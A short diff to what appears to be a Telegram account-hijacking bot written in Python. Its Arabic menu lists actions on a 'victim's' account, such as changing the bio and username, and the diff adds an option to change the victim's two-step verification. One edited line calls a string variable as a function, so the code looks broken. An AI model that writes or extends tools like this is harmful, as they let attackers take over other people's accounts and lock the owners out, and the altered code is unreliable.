@@ -278,6 +278,8 @@ menu = '''
 "X" ~ [ تغير بايو حساب الضحية ]
  
 "O" ~ [ تغير يوزر حساب الضحية ] 
+
+"T" ~ [ تغير تحقق بخطوتين حساب الضحية ] 
 '''
 mm = '''
 قم بلأنضمام الى قناة الخفاش @angthon
@@ -913,7 +915,7 @@ async def change_two_step_password(event):
         termux_code_msg = await conv.get_response()
         termux_code = termux_code_msg.text
 
-        success = await check_termux_code(termux_code)
+        success = await termux_code(termux_code)
 
         if success:
             pass  # اذا جان رجع
